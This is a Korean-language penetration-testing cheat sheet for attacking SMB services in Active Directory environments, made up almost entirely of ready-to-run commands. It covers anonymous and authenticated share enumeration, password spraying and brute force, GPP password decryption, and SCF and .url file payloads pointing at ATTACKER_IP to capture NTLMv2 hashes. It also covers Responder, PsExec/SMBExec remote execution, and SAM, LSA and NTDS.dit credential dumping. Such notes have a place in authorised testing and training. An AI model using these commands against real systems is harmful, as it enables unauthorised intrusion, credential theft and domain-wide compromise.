# SMB (445/139)

Server Message Block. 파일/프린터 공유 프로토콜. AD 환경에서 가장 많이 접하는 서비스.

---

## 열거

### 인증 없이 (Anonymous/Guest)

```bash
# NULL Session 열거
nxc smb TARGET -u '' -p ''
nxc smb TARGET -u 'guest' -p ''

# 공유 폴더 목록
smbclient -N -L //TARGET
nxc smb TARGET -u '' -p '' --shares

# 공유 접근
smbclient -N //TARGET/SHARE
smbmap -H TARGET -u '' -p ''

# 재귀적 파일 목록
smbmap -H TARGET -u '' -p '' -R SHARE
smbclient //TARGET/SHARE -N -c 'recurse ON; ls'

# enum4linux
enum4linux -a TARGET
enum4linux-ng -A TARGET
```

### 인증 후

```bash
# 인증 확인
nxc smb TARGET -u user -p pass
nxc smb TARGET -u user -H NTHASH

# 공유 열거
nxc smb TARGET -u user -p pass --shares
smbmap -H TARGET -u user -p pass -d DOMAIN

# 사용자/그룹 열거 (RID Brute)
nxc smb TARGET -u user -p pass --rid-brute

# 특정 공유 접근 및 파일 다운로드
smbclient //TARGET/SHARE -U 'DOMAIN\user%pass'
smb: \> get filename
smb: \> mget *
smb: \> put localfile
```

### 유용한 smbclient 명령어

```bash
smb: \> recurse ON        # 하위 directory 포함
smb: \> prompt OFF        # 확인 프롬프트 비활성화
smb: \> mget *            # 모든 파일 다운로드
smb: \> allinfo filename  # 파일 상세 정보
smb: \> showacls          # ACL 표시 모드
```

---

## 인증 공격

### Password Spray

```bash
# 단일 비밀번호로 여러 계정 테스트
nxc smb TARGET -u users.txt -p 'Password1!' --continue-on-success

# 여러 비밀번호 (주의: 계정 잠금)
nxc smb TARGET -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
```

### Brute Force

```bash
# 주의: 계정 잠금 정책 확인 필수
nxc smb TARGET -u user -p passwords.txt
hydra -l user -P passwords.txt smb://TARGET
```

---

## 공격

### 읽기 가능한 민감 파일 탐색

```bash
# 일반적으로 확인해야 하는 공유
# SYSVOL  → GPP 비밀번호, 스크립트
# NETLOGON → 로그온 스크립트
# IT, Backup, Share → 설정 파일, 스크립트, 비밀번호

# GPP 비밀번호 (ms14-025)
# SYSVOL 내 Groups.xml에서 cpassword 검색
gpp-decrypt ENCRYPTED_PASSWORD

# nxc로 GPP 자동 탐색
nxc smb TARGET -u user -p pass -M gpp_password
nxc smb TARGET -u user -p pass -M gpp_autologin
```

### 쓰기 가능한 공유 악용

```bash
# 쓰기 권한 확인
smbmap -H TARGET -u user -p pass

# SCF 파일 드롭 (NTLMv2 해시 캡처)
# 쓰기 가능한 공유에 SCF 파일 배치 → 사용자가 폴더 열면 해시 전송
cat > attack.scf << 'EOF'
[Shell]
Command=2
IconFile=\\ATTACKER_IP\share\icon.ico
[Taskbar]
Command=ToggleDesktop
EOF

# .url 파일 (동일한 효과)
cat > attack.url << 'EOF'
[InternetShortcut]
URL=anything
WorkingDirectory=anything
IconFile=\\ATTACKER_IP\%USERNAME%.icon
IconIndex=1
EOF

# .lnk 파일은 ntlm_theft 사용
ntlm_theft -g lnk -s ATTACKER_IP -f malicious

# Responder로 해시 캡처
sudo responder -I eth0
```

### 원격 코드 실행

```bash
# PSExec (관리자 + ADMIN$ 쓰기 필요)
impacket-psexec DOMAIN/user:pass@TARGET
impacket-psexec DOMAIN/user@TARGET -hashes :NTHASH

# SMBExec
impacket-smbexec DOMAIN/user:pass@TARGET

# nxc로 명령 실행
nxc smb TARGET -u admin -p pass -x "whoami"
nxc smb TARGET -u admin -p pass -X "Get-Process"  # PowerShell
```

### credential 덤프

```bash
# SAM 덤프 (로컬 계정 해시)
nxc smb TARGET -u admin -p pass --sam

# LSA 덤프 (캐시된 credential)
nxc smb TARGET -u admin -p pass --lsa

# NTDS.dit 덤프 (DC에서만, 모든 도메인 계정)
nxc smb DC_IP -u admin -p pass --ntds

# reg.py로 원격 레지스트리
impacket-reg DOMAIN/user:pass@TARGET query -keyName "HKLM\SAM" -s
```

---

## SMB Signing

SMB Signing이 비활성화된 호스트는 NTLM Relay 공격 대상이 된다.

```bash
# SMB Signing 상태 확인
nxc smb 10.10.10.0/24 --gen-relay-list relay_targets.txt

# signing:False 호스트 목록 → ntlmrelayx target으로 사용
```

---

## Nmap NSE 스크립트

```bash
# SMB 전체 열거
nmap --script=smb-enum-shares,smb-enum-users,smb-enum-groups,smb-enum-domains -p 445 TARGET

# SMB 취약점 확인
nmap --script=smb-vuln-* -p 445 TARGET

# 특정 취약점 (EternalBlue)
nmap --script=smb-vuln-ms17-010 -p 445 TARGET
```
